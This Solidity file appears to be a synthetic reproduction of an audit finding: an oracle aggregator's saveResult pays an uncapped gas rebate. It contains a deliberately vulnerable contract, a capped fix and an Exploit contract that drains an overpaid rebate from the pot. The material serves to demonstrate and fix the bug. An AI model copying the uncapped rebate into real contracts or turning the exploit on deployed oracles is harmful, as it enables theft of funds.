// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Switchboard — unbounded gas rebate (OtterSec, #47983)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: saveResult pays reward + (gasleft snapshot delta) * gas price
    with no cap on the gas it counts. A block builder sets a high gas price
    and does not pay that price. This VM reports tx.gasprice == 0, so the
    formula uses builderGasPrice (100 gwei), the price the builder would set.
    The caller is paid more wei than the same gas costs at 1 gwei. The control
    caps the counted gas at MAX_REBATE_GAS. */

contract Aggregator {
    uint256 public reward;
    uint256 public builderGasPrice;
    uint256 public balanceLeftForInterval;
    uint256 public gasUsed;
    uint256 public rebatePaid;
    uint256 public gasSpentWei;
    uint256 public sink;
    int256 public lastResult;

    event Rebate(uint256 fullReward, uint256 gasUsed);

    constructor() {
        reward = 1;
        builderGasPrice = 100 gwei;
        balanceLeftForInterval = 1 ether;
    }

    receive() external payable {}

    function _intensive() internal {
        uint256 acc = sink + 1;
        for (uint256 i = 0; i < 40; i++) {
            acc = acc + i + 1;
            sink = acc;
        }
    }

    function _price() internal view returns (uint256 price) {
        price = tx.gasprice;
        if (price == 0) {
            price = builderGasPrice;
        }
    }

    // contracts/src/aggregator/Aggregator.sol — saveResult
    function saveResult(address aggregatorId, address oracleId, int256 result) external {
        aggregatorId;
        oracleId;
        lastResult = result;
        // snapshot gas left
        uint256 remainingGas = gasleft();
        /* computation intensive work */
        _intensive();
        uint256 price = _price();
        // @> VULN: uncapped gas delta times the builder gas price, paid from the pot
        uint256 fullReward = reward + (remainingGas - gasleft()) * price;
        // FIX: uint256 spent = remainingGas - gasleft(); if (spent > MAX) spent = MAX; fullReward = reward + spent * price;
        gasUsed = (fullReward - reward) / price;
        gasSpentWei = gasUsed * 1 gwei;
        // remove funds from interval balance if we can (and if reward is not 0)
        if (balanceLeftForInterval >= fullReward && reward != 0) {
            balanceLeftForInterval -= fullReward;
            // pay oracle for gas spend + reward - handing off trust to the oracle
            payable(msg.sender).transfer(fullReward);
            rebatePaid = fullReward;
            emit Rebate(fullReward, gasUsed);
        }
    }
}

contract AggregatorFixed {
    uint256 public constant MAX_REBATE_GAS = 20_000;
    uint256 public reward;
    uint256 public builderGasPrice;
    uint256 public balanceLeftForInterval;
    uint256 public gasUsed;
    uint256 public countedGas;
    uint256 public rebatePaid;
    uint256 public sink;

    constructor() {
        reward = 1;
        builderGasPrice = 100 gwei;
        balanceLeftForInterval = 1 ether;
    }

    receive() external payable {}

    function _intensive() internal {
        uint256 acc = sink + 1;
        for (uint256 i = 0; i < 40; i++) {
            acc = acc + i + 1;
            sink = acc;
        }
    }

    function _price() internal view returns (uint256 price) {
        price = tx.gasprice;
        if (price == 0) {
            price = builderGasPrice;
        }
    }

    function saveResult(address, address, int256 result) external {
        result;
        uint256 remainingGas = gasleft();
        _intensive();
        uint256 price = _price();
        uint256 spent = remainingGas - gasleft();
        gasUsed = spent;
        if (spent > MAX_REBATE_GAS) {
            spent = MAX_REBATE_GAS;
        }
        countedGas = spent;
        uint256 fullReward = reward + spent * price;
        if (balanceLeftForInterval >= fullReward && reward != 0) {
            balanceLeftForInterval -= fullReward;
            payable(msg.sender).transfer(fullReward);
            rebatePaid = fullReward;
        }
    }
}

contract Exploit {
    Aggregator public agg; // nonce 1

    uint256 public gasUsed;
    uint256 public rebateWei;
    uint256 public gasSpentWei;
    uint256 public constant SEED = 1 ether;

    constructor() {
        agg = new Aggregator();
    }

    function run() external payable {
        require(msg.value == SEED, "seed");
        require(tx.gasprice == 0, "playground gasprice");
        (bool funded,) = address(agg).call{value: SEED}("");
        require(funded, "fund pot");
        require(address(agg).balance == SEED, "pot holds 1 ether");
        agg.saveResult(address(agg), address(0xBEEF), int256(2000 ether));
        gasUsed = agg.gasUsed();
        rebateWei = agg.rebatePaid();
        gasSpentWei = agg.gasSpentWei();
        require(gasUsed > 20_000, "gas above the cap");
        require(rebateWei == 1 + gasUsed * 100 gwei, "rebate formula");
        require(gasSpentWei == gasUsed * 1 gwei, "fair gas cost");
        require(rebateWei > gasSpentWei, "rebate exceeds gas spent");
        require(address(this).balance == rebateWei, "caller received the rebate");
        require(address(agg).balance == SEED - rebateWei, "taken from the pot");
    }

    receive() external payable {}
}
